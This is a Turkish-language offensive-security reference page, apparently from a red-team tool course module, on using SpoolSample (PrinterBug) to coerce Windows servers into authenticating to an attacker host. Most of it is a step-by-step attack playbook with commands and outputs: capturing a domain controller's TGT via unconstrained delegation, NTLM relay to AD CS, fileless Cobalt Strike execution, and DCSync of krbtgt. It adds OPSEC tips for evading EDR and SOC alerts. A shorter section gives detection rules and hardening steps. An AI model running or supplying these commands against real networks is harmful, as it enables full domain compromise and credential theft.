# SpoolSample

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Print Spooler (MS-RPRN) servisindeki `RpcRemoteFindFirstPrinterChangeNotificationEx` fonksiyonunu tetikleyerek hedef sunucuları saldırganın belirlediği adrese kimlik doğrulamaya zorlayan C# aracı (PrinterBug).

---

## 1. Genel Bakış ve Amaç

**SpoolSample** (SpecterOps araştırmacısı Lee Christensen / @tifkin_ tarafından geliştirilen), Active Directory güvenlik araştırmalarında çığır açan ve siber güvenlik literatürüne **PrinterBug** olarak geçen kimlik doğrulama zorlama tekniğinin öncü aracıdır.

Microsoft'un **MS-RPRN (Print System Remote Protocol)** mimarisi, ağ üzerindeki istemcilerin bir sunucudaki yazdırma kuyruğunu ve yazıcı durum değişikliklerini uzaktan izlemesine olanak tanır. Protokol bünyesindeki `RpcRemoteFindFirstPrinterChangeNotificationEx` API fonksiyonu, istemcinin sunucuya "Yazıcı durumunda bir değişiklik olursa beni şu adresten bilgilendir" demesine imkan verir. Bildirimin yapılacağı adres olarak istemci keyfi bir UNC yolu (`\\attacker\pipe\spoolss`) belirtebilir.

Hedef Windows sunucusunda veya Domain Controller'da **Print Spooler (`spoolsv.exe`)** servisi çalışıyorsa, sunucu bildirimi iletmek üzere derhal kendi makine hesabı (**NT AUTHORITY\SYSTEM**) context'inde verilen UNC adresine bir SMB bağlantısı açar.

Bu mekanizma özellikle **Sınırsız Yetkilendirme (Unconstrained Delegation)** zafiyeti ile birleştiğinde ölümcül bir etki yaratır:
1. Saldırgan etki alanında Unconstrained Delegation hakkı olan bir sunucuyu (örneğin bir Web sunucusu) ele geçirir.
2. `SpoolSample` kullanarak Domain Controller'ı bu ele geçirilmiş sunucuya bağlanmaya zorlar (`SpoolSample DC01 WebServer`).
3. Domain Controller, sunucunun sınırsız yetkili olduğunu gördüğü için Kerberos kimlik doğrulaması sırasında **kendi TGT biletini (DC01$ TGT)** sunucunun LSASS belleğine emanet eder.
4. Saldırgan `Rubeus` veya `Mimikatz` ile LSASS'tan bu TGT'yi dökerek saniyeler içinde **Domain Admin** yetkisine ulaşır!

```
       [ Saldırgan ]
             |
     1. MS-RPRN RPC Çağrısı (Port 445 SMB / \pipe\spoolss)
        RpcRemoteFindFirstPrinterChangeNotificationEx(Target: DC01, Callback: WebServer)
             |
             v
       [ Hedef Domain Controller (DC01) ]
             |
     2. spoolsv.exe (SYSTEM Context) SMB Bağlantısı Açar:
        \\WebServer\pipe\spoolss
             |
             v
     =========================================== Yerel Ağ (Kerberos / SMB)
             |
             v
       [ Ele Geçirilmiş Sunucu (Unconstrained Delegation) ]
             |
     3. DC01$ Kerberos TGT Bileti LSASS Belleğine Kaydedildi!
             |
             v
       [ Rubeus monitor / dump ] ===> DC01$ TGT Bileti Alındı -> DCSync -> Domain Admin!
```

### Neden Önemli?
- **Unconstrained Delegation Sömürüsünün Anahtarı:** Sınırsız yetkilendirilmiş bir sunucuya Domain Controller'ın kendiliğinden bağlanmasını beklemek yerine, SpoolSample ile bu bağlantı operatör tarafından istendiği an zorla tetiklenebilir.
- **NTLM Relay Desteği:** Tetiklenen bağlantı `ntlmrelayx` dinleyicisine yönlendirilerek AD CS Sertifika Servislerine veya SMB imzalama gerektirmeyen diğer sunuculara relay edilebilir.
- **Doğrudan Bellekten Çalışma:** Saf C# .NET derlemesi olduğu için Cobalt Strike, Sliver veya Havoc üzerinden `execute-assembly` ile diske yazılmadan çalıştırılabilir.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | SpoolSample | Dementor | PetitPotam |
|---|---|---|---|
| **Platform** | Windows (C# .NET) | Linux (Python) | Linux (Python) / Windows (C++) |
| **Kullandığı Protokol** | MS-RPRN (Print Spooler) | MS-RPRN (Print Spooler) | MS-EFSR (Encrypting File System) |
| **Çalışma Biçimi** | `execute-assembly`, CLI | Komut satırı (Linux) | Komut satırı / execute-assembly |
| **DC'de Varsayılan Durum** | Genellikle kapatılır (Sertleştirme) | Genellikle kapatılır | Daima açıktır (EFS) |
| **Anonim Çalışma** | Hayır (Kimlik gerekir) | Hayır (Kimlik gerekir) | Eski sürümlerde evet |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

SpoolSample iki ana argüman kabul eder: Hedef sunucu ve geri dönüş yapılacak dinleyici makine adı/IP'si.

```cmd
SpoolSample.exe <Hedef_Sunucu> <Geri_Dönüş_Sunucusu>
```

### Kritik Parametreler Tablosu

| Parametre / Argüman | Açıklama | Örnek Değer |
|---|---|---|
| `<Hedef_Sunucu>` | Zorlanacak Windows sunucusu veya Domain Controller FQDN/IP adresi (Zorunlu). | `dc01.lab.local`, `192.168.1.10` |
| `<Geri_Dönüş_Sunucusu>` | Hedef sunucunun SMB bağlantısı açacağı saldırgan veya pivot sunucu adı (Zorunlu). | `web01.lab.local`, `192.168.1.50` |

> **Önemli Not:** Kerberos üzerinden TGT yakalama senaryolarında `<Geri_Dönüş_Sunucusu>` argümanı bir IP adresi değil, mutlaka hedefin Kerberos SPN çözümleyebileceği bir **FQDN veya NetBIOS makine adı** (`web01.lab.local`) olmalıdır. IP adresi verilirse Windows Kerberos yerine NTLM kimlik doğrulamasına düşer.

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Klasik Unconstrained Delegation ve PrinterBug ile Domain Admin Ele Geçirme

Ele geçirilmiş sınırsız yetkili `APPSRV01` makinesi üzerinde Rubeus dinleme modundayken SpoolSample ile DC'yi tetikleme.

```powershell
# 1. Terminal (APPSRV01 üzerinde): Rubeus ile gelen TGT'leri dinlemeye al
Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
```
```powershell
# 2. Terminal (APPSRV01 veya Saldırgan makinesinde): SpoolSample'ı ateşle
SpoolSample.exe DC01.lab.local APPSRV01.lab.local
```

```text
[+] Attempting to trigger connection from DC01.lab.local to APPSRV01.lab.local
[+] Bound to MS-RPRN interface successfully!
[+] Calling RpcRemoteFindFirstPrinterChangeNotificationEx...
[+] Target server accepted the notification request!
```
```text
[Rubeus Konsolu Çıktısı]
[*] [2026-10-14 15:30:12] Kerberos TGT request detected!
[*] User                  : DC01$
[*] ServiceName           : krbtgt/lab.local
[*] Base64 Encoded Ticket :
    doIFqDCCBaSgAwIBBaEDAgEWooIE...
[+] Successfully captured TGT for DC01$!
```
*Analiz:* DC01 sunucusu APPSRV01'e SMB bağlantısı başlattı ve sınırsız yetkilendirme nedeniyle kendi TGT biletini APPSRV01'in belleğine bıraktı. Rubeus bu bileti yakaladı; saldırgan doğrudan DCSync çalıştırabilir.

---

### Senaryo 2: Cobalt Strike Beacon Üzerinden Dosyasız (In-Memory) Yürütme

Bellekten `execute-assembly` yöntemiyle SpoolSample çalıştırma.

```text
beacon> execute-assembly C:\Tools\SpoolSample.exe DC02.corp.local PIVOT-SRV.corp.local
```

```text
[*] Tasked beacon to run assembly: SpoolSample.exe DC02.corp.local PIVOT-SRV.corp.local
[+] host called home, sent: 28672 bytes
[+] Triggering RPC call to target: DC02.corp.local
[+] Notification dispatch returned success.
```
*Analiz:* İkili dosya diske yazılmadan RAM'den yürütüldü ve uzaktaki DC02 makinesi koersiyona zorlandı.

---

### Senaryo 3: ntlmrelayx Dinleyicisine Yönlendirerek NTLM Relay Yapma

Kerberos yerine NTLM düşürmek için geri dönüş parametresi olarak saldırganın IP adresi verilir.

```bash
# Saldırgan Kali makinesinde ntlmrelayx hazır bekler:
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs
```
```cmd
# Kurban veya saldırgan Windows makinesinde SpoolSample:
SpoolSample.exe 192.168.1.10 192.168.1.50
```

```text
[ntlmrelayx Konsolu]
[*] Received connection from 192.168.1.10
[*] Relaying authentication for LAB\DC01$ to AD CS Web Enrollment...
[+] Exported certificate for DC01$: DC01.pfx
```
*Analiz:* IP adresi kullanıldığı için DC Kerberos yerine NTLMv2 gönderdi; ntlmrelayx kimliği yakalayıp AD CS sertifikasına dönüştürdü.

---

### Senaryo 4: rpcdump.py ile Hedefte Spooler Servisinin Açık Olduğunu Doğrulama

SpoolSample çalıştırmadan önce hedefte `\pipe\spoolss` servisinin aktif olup olmadığını pasif kontrol etme.

```bash
rpcdump.py lab.local/can.oz:Pass123!@192.168.1.10 | grep -i "spoolss"
```

```text
Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolss.dll
UUID: 12345678-1234-abcd-ef00-0123456789ab v1.0
Endpoint: ncacn_np:[\\pipe\\spoolss]
```
*Analiz:* MS-RPRN protokolünün `spoolss` named pipe'ı üzerinden açık olduğu ve SpoolSample için hazır olduğu doğrulandı.

---

### Senaryo 5: Standart Web Sunucusunu Hedefleme (Yanal Hareket)

Yalnızca Domain Controller değil, dosya sunucusu veya MSSQL sunucusunun makine hesabını ele geçirmek için çalıştırma.

```cmd
SpoolSample.exe FILESRV01.lab.local 192.168.1.50
```
*Analiz:* Dosya sunucusunun `FILESRV01$` makine hesabı tetiklendi; saldırgan bu hesabın yetkilerini kullanarak yerel paylaşımlara erişim sağladı.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `RPC_S_SERVER_UNAVAILABLE (0x6ba)` | Hedef sistemde Print Spooler servisi kapatılmıştır veya port 445 erişilemez durumdadır. | DC'de Spooler kapalıysa alternatif koersiyon araçlarına (`PetitPotam` veya `DFSCoerce`) geçin. Port erişimini `Test-NetConnection -Port 445` ile kontrol edin. |
| `STATUS_OBJECT_NAME_NOT_FOUND (0xc0000034)` | Hedefte `\pipe\spoolss` named pipe'ı bulunamadı. | Sunucunun bir yazdırma sunucusu rolü üstlenmediğini veya servisin çöktüğünü gösterir; diğer koersiyon metotlarını deneyin. |
| `Target contacted listener but no TGT received (Only NTLM captured)` | Geri dönüş adresi olarak IP adresi (`192.168.1.50`) belirtilmiştir. | Kerberos TGT yakalamak için geri dönüş parametresi mutlaka FQDN adı (`SRV01.lab.local`) olmalıdır. |
| `Access is denied (0x5)` | RPC arayüzü kısıtlanmış veya kullanıcının oturum açma yetkisi bulunmamaktadır. | Doğrulanmış geçerli bir etki alanı kullanıcısıyla oturum açıldığından emin olun. |
| `Rubeus TGT yakalamadı / LSASS boş` | Geri dönüş yapılan makinede Unconstrained Delegation (`TRUSTED_FOR_DELEGATION`) aktif değildir. | Makinenin AD üzerindeki `userAccountControl` özniteliğini kontrol edin (`Get-DomainComputer -Unconstrained`). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Domain Controller Event ID 5145 (A network share object was accessed):**
  - Share Name: `\\*\IPC$`
  - Relative Target Name: `spoolss`
  - Access Mask: `0x12019F`.
- **Domain Controller Event ID 4624 (Logon):**
  - Logon Type: `3` (Network Logon).
  - Çağrıyı başlatan kullanıcının adı ve IP adresi.
- **Sysmon Event ID 3 (Network Connection Detected):**
  - **Kritik EDR İmzası:** `spoolsv.exe` sürecinin harici veya anormal bir IP adresine TCP 445 üzerinden giden bağlantı başlatması.

### 5.2 Ağ ve EDR İmzaları
- **spoolsv.exe Dış Bağlantı Anomalisi:** Normal şartlarda bir Domain Controller'daki Print Spooler servisinin diğer sunuculara veya rastgele IP'lere SMB bağlantısı açması beklenmez. EDR'lar (CrowdStrike, Defender for Identity) bu davranışı anında "PrinterBug / Forced Authentication" alarmı olarak işaretler.
- **RPC Opnum İmzası:** MS-RPRN arayüzünde Opnum `58` (`RpcRemoteFindFirstPrinterChangeNotificationEx`) çağrısının yapılması.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1187** | Forced Authentication | Print Spooler servisini SMB bağlantısı kurmaya zorlama. |
| **T1558.001** | Steal or Forge Kerberos Tickets: Kerberoasting / Delegation | Unconstrained Delegation ile TGT bileti yakalama. |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | IPC$ ve spoolss named pipe erişimi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Spooler Kapalıysa Alarm Riski:** Kapalı servise RPC çağrısı hata logu üretir. | Öncesinde `rpcdump` ile spoolss pipe'ının varlığını kontrol edin. |
| **spoolsv.exe Bağlantı Alarmı:** SOC ekipleri spoolsv bağlantılarını yakından izler. | Sadece mutlak yetki yükseltme aşamasında (Unconstrained ele geçirildiğinde) tek seferlik çalıştırın. |
| **Diske Dosya Bırakma:** Derlenmiş ikili AV radarına takılabilir. | `execute-assembly` ile doğrudan bellekten yürütün. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — spoolsv.exe Dış Bağlantı Tespiti)
```yaml
title: Print Spooler Outbound Network Connection (PrinterBug)
status: experimental
description: spoolsv.exe sürecinin SMB (port 445) üzerinden dışarıya bağlantı açması.
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        Image|endswith: '\spoolsv.exe'
        DestinationPort:
            - 445
            - 139
    condition: selection
level: critical
```

#### Tespit Kuralı (KQL — Microsoft Defender for Endpoint)
```kql
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "spoolsv.exe"
| where RemotePort in (445, 139)
| project Timestamp, DeviceName, InitiatingProcessAccountName, RemoteIP, RemotePort
| order by Timestamp desc
```

#### Sertleştirme ve Önleme Adımları
1. **Domain Controller'larda Print Spooler'ı Kapatma (ZORUNLU):** Domain Controller sunucularında fiziksel yazıcı bulunmayacağı için Spooler servisi tamamen kapatılmalıdır:
   ```powershell
   Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled
   ```
2. **Unconstrained Delegation Kullanımını Kaldırma:** Ortamdaki sunuculardan `TRUSTED_FOR_DELEGATION` bayrağı kaldırılmalı, yerine **Constrained Delegation** veya **RBCD** yapılandırılmalıdır.
3. **Hassas Hesapları Koruma:** Domain Admin ve kritik hesaplarda **"Account is sensitive and cannot be delegated"** seçeneği işaretlenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```cmd
# 1. Klasik SpoolSample çalıştırma (Hedef DC -> Saldırgan Dinleyici)
SpoolSample.exe DC01.sirket.local PIVOT-SRV.sirket.local
```
- **Ne Yapar?:** DC01'in Spooler servisini tetikleyerek `PIVOT-SRV` makinesine SMB bağlantısı kurdurur.
- **Ne Zaman Kullanılır?:** Unconstrained Delegation ile TGT yakalama operasyonlarında.
- **Parametreler:** `DC01.sirket.local`: Hedef; `PIVOT-SRV.sirket.local`: Geri dönüş sunucusu.

```text
# 2. Cobalt Strike Beacon üzerinden bellekten yürütme
beacon> execute-assembly C:\Tools\SpoolSample.exe DC01.sirket.local WEB01.sirket.local
```
- **Ne Yapar?:** SpoolSample ikilisini diske yazmadan Beacon sürecinin RAM'inde çalıştırır.
- **Ne Zaman Kullanılır?:** EDR atlatma ve sessiz yetki yükseltme aşamasında.
- **Parametreler:** `execute-assembly`: Bellek yürütücüsü.

```powershell
# 3. Rubeus ile gelen TGT'yi yakalamak için izleme başlatma
Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
```
- **Ne Yapar?:** SpoolSample çalışmadan önce belleğe düşecek DC TGT'sini bekler ve çıktısını alır.
- **Ne Zaman Kullanılır?:** Unconstrained sunucu üzerinde SpoolSample tetiklemesinden hemen önce.
- **Parametreler:** `/interval:5`: Kontrol sıklığı; `/filteruser`: İzlenecek makine hesabı.

```cmd
# 4. ntlmrelayx dinleyicisine NTLM düşürmek için IP ile çalıştırma
SpoolSample.exe 192.168.1.10 192.168.1.50
```
- **Ne Yapar?:** Geri dönüş adresi olarak IP vererek Kerberos yerine NTLM kimlik doğrulamasını zorlar.
- **Ne Zaman Kullanılır?:** AD CS veya LDAP NTLM relay operasyonlarında.
- **Parametreler:** `192.168.1.10`: Hedef DC; `192.168.1.50`: ntlmrelayx dinleyici IP'si.

```bash
# 5. Linux üzerinden Dementor ile Spooler koersiyonu (Python alternatifi)
python3 dementor.py -u ahmet -p Sifre123 -d sirket.local 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** SpoolSample mantığını Linux üzerinden Python ile çalıştırır.
- **Ne Zaman Kullanılır?:** Windows işletim sistemi bulunmadığında Kali üzerinden tetikleme için.
- **Parametreler:** `-u/-p/-d`: Kimlik; `192.168.1.50`: Dinleyici; `192.168.1.10`: Hedef.

```powershell
# 6. Unconstrained Delegation sunucularını PowerView ile bulma
Get-DomainComputer -Unconstrained | Select-Object name, distinguishedname
```
- **Ne Yapar?:** Etki alanında TGT emanet alabilecek sınırsız yetkili bilgisayarları listeler.
- **Ne Zaman Kullanılır?:** SpoolSample'ın nereye geri döneceğini belirlemek için.
- **Parametreler:** `-Unconstrained`: Sınırsız yetki filtresi.

```bash
# 7. Hedefte Spooler açık mı kontrol etme (rpcdump)
rpcdump.py sirket.local/ahmet:Sifre123@192.168.1.10 | grep -i "spoolss"
```
- **Ne Yapar?:** Hedef sunucuda `spoolss` named pipe'ının dinlenip dinlenmediğini denetler.
- **Ne Zaman Kullanılır?:** Boşuna tetikleme yapıp hata logu üretmemek için.
- **Parametreler:** `rpcdump.py`: RPC arayüz dökücüsü.

```powershell
# 8. Yakalanan DC TGT'si ile DCSync çalıştırma
Rubeus.exe ptt /ticket:<Base64_TGT>
mimikatz "lsadump::dcsync /domain:sirket.local /user:krbtgt" exit
```
- **Ne Yapar?:** SpoolSample ile yakalanan TGT'yi oturuma enjekte edip `krbtgt` parolasını çeker.
- **Ne Zaman Kullanılır?:** Saldırının son aşamasında Golden Ticket üretmek için.
- **Parametreler:** `ptt`: Pass-the-Ticket.

```cmd
# 9. WebDAV formatında UNC adresi ile tetikleme
SpoolSample.exe DC01.sirket.local attacker@80\share
```
- **Ne Yapar?:** Spooler servisini standart SMB yerine WebDAV üzerinden bağlantı açmaya zorlar.
- **Ne Zaman Kullanılır?:** Port 445 engellendiğinde WebClient servisine yönlendirmek için.
- **Parametreler:** `@80\share`: WebDAV sözdizimi.

```powershell
# 10. Hedef DC'de Spooler servis durumunu PowerShell ile sorgulama
Get-Service -ComputerName DC01 -Name Spooler
```
- **Ne Yapar?:** Uzak sunucudaki Print Spooler servisinin çalışıp çalışmadığını gösterir.
- **Ne Zaman Kullanılır?:** SpoolSample öncesi hızlı ön kontrol için.
- **Parametreler:** `-ComputerName`: Hedef; `-Name Spooler`: Servis adı.

---

## Kaynaklar

- **Resmi GitHub Deposu (SpoolSample):** [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)
- **SpecterOps — Not A Security Boundary (The PrinterBug Story):** [https://posts.specterops.io/not-a-security-boundary-ebbef7a7d5b5](https://posts.specterops.io/not-a-security-boundary-ebbef7a7d5b5)
- **Microsoft Open Specifications — MS-RPRN Protocol:** [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/)

---

> **Önceki:** [← PetitPotam](./PetitPotam.md) · **Sonraki:** [DFSCoerce →](./DFSCoerce.md)
